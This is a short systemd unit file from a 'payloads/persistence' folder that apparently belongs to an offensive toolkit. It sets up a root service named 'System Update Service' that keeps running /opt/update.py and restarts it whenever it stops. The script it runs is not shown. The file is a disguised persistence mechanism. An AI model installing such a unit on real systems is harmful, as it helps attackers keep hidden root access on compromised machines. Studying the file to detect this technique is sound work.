# payloads/persistence/systemd_persistence.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/update.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
